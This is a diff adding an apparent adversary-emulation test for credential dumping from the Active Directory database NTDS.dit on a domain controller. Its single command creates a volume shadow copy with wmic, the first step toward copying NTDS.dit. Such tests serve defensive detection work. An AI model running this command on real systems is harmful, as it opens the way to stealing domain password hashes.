@@ -1,0 +1,12 @@
+#TechniqueName: OS Credential Dumping: NTDS
+#AtomicTestName: Create Volume Shadow Copy with WMI
+#Description: This test is intended to be run on a domain Controller.&&The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.&
+#Language: cmd
+
+#get_prereq_commands
+echo Sorry, Promoting this machine to a Domain Controller must be done manually
+
+
+#commands
+wmic shadowcopy call create Volume=C:
+
